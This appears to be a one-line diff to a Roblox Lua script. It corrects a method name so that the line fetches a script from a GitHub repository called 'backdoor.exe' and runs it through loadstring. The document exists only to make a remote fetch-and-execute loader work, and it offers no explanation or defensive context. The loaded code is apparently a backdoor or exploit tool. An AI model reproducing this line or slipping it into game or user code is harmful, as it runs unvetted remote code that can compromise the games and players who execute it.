@@ -1,1 +1,1 @@
-loadstring(game:GetHttp("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
